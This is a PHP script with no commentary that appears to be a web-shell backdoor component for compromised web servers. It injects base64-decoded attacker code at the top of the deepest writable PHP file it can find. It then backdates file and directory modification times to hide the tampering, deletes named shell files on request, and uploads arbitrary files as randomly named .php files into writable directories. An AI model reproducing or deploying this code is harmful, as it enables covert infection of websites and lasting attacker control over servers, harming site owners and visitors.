<?php

error_reporting(0);

$shellPath = pathinfo($_SERVER['REQUEST_URI'], PATHINFO_DIRNAME);

if ($shellPath === '/' || $shellPath === '\\') {
    $shellPath = '';
}

$shellDir = dirname(__FILE__);
$levelUp = str_repeat(DIRECTORY_SEPARATOR . '..', substr_count($shellPath, '/'));

$wwwPath = realpath($shellDir . $levelUp);

if(empty($wwwPath)) {
    $wwwPath = $shellDir . $levelUp;
}

if (isset($_POST['patch'])) {
    $fileFound = null;

    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($wwwPath), RecursiveIteratorIterator::CHILD_FIRST
        );
        $iterator->setMaxDepth(intval($_POST['sd'] - 1));

        $dirDepth = 0;

        foreach ($iterator as $splFileInfo) {
            if ($splFileInfo->getPath() !== $shellDir) {
                $pathInfo = pathinfo($splFileInfo->getFilename());

                if ($pathInfo['basename'] != '.' && $pathInfo['basename'] != '..' && !$splFileInfo->isDir() && $splFileInfo->isWritable() && @$pathInfo['extension'] == 'php') {
                    if ($iterator->getDepth() >= $dirDepth) {
                        $dirDepth = $iterator->getDepth();
                        $fileFound = $splFileInfo->getPathname();
                    }
                }
            }
        }
    } catch (UnexpectedValueException $e) {

    }

    if (is_null($fileFound)) {
        echo 'e:ff';
    } else {
        $fileDir = dirname($fileFound);
        $mTime = @filemtime($fileDir);

        $fileData = base64_decode($_POST['patch']) . PHP_EOL;
        $fileData .= file_get_contents($fileFound);

        if (file_put_contents($fileFound, $fileData) === false) {
            echo 'e:fw';
        } else {
            if ($mTime !== false) {
                touch($fileDir, $mTime);
                touch($fileFound, $mTime + rand(0, 5));
            }

            $path = str_replace($wwwPath, '', $fileDir) . '/' . basename($fileFound);
            echo 'o:' . str_replace("\\", "/", $path);
        }
    }
} elseif (isset($_POST['shn'])) {
    $shellName = base64_decode($_POST['shn']);
    $inputDir = base64_decode(str_replace("/", DIRECTORY_SEPARATOR, $_POST['shd']));

    if ($shellName === false) {
        echo 'e:de';
    } elseif (!unlink($wwwPath . $inputDir . DIRECTORY_SEPARATOR . $shellName)) {
        echo 'e:rs';
    } else {
        echo 'ok';
    }
} elseif (isset($_FILES['file']['name'])) {
    if ($_FILES['file']['error'] !== UPLOAD_ERR_OK) {
        echo 'e:uf';
    } else {
        if (isset($_POST['name'])) {
            $fileName = $_POST['name'];
        } else {
            $fileName = rand(1000, 9999) . '.php';
        }

        if (isset($_POST['root'])) {
            if (is_writable($wwwPath)) {
                $dirPath = $wwwPath;
            } else {
                $dirPath = null;

                try {
                    $iterator = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($wwwPath), RecursiveIteratorIterator::SELF_FIRST
                    );
                    $iterator->setMaxDepth(6);

                    foreach ($iterator as $splFileInfo) {
                        if ($splFileInfo->getFilename() != '.' && $splFileInfo->getFilename() != '..') {
                            if ($splFileInfo->isDir() && $splFileInfo->isWritable()) {
                                $dirPath = $splFileInfo->getPathname();

                                break;
                            }
                        }
                    }
                } catch (UnexpectedValueException $e) {

                }

                if (is_null($dirPath)) {
                    $dirPath = $shellDir;
                }
            }
        } else {
            $dirPath = null;

            try {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($wwwPath), RecursiveIteratorIterator::CHILD_FIRST
                );
                $iterator->setMaxDepth(intval($_POST['depth'] - 1));

                $dirDepth = 0;

                foreach ($iterator as $splFileInfo) {
                    if ($splFileInfo->getFilename() != '.' && $splFileInfo->getFilename() != '..') {
                        if ($splFileInfo->isDir() && $splFileInfo->isWritable()) {
                            if ($iterator->getDepth() >= $dirDepth) {
                                $dirDepth = $iterator->getDepth();
                                $dirPath = $splFileInfo->getPathname();
                            }
                        }
                    }
                }
            } catch (UnexpectedValueException $e) {

            }

            if (is_null($dirPath)) {
                if (is_writable($shellDir)) {
                    $dirPath = $shellDir;
                }

                if (is_writable($wwwPath)) {
                    $dirPath = $wwwPath;
                }
            }
        }

        $filePath = $dirPath . DIRECTORY_SEPARATOR . $fileName;

        if (move_uploaded_file($_FILES['file']['tmp_name'], $filePath)) {
            chmod($filePath, 0644);

            $path = str_replace($wwwPath, '', $filePath);
            $path = str_replace(DIRECTORY_SEPARATOR, '/', $path);
            echo 'o:' . str_replace("", "/", $path);
        } else {
            echo 'e:nm';
        }
    }
} else {
    echo 'e:nu';
}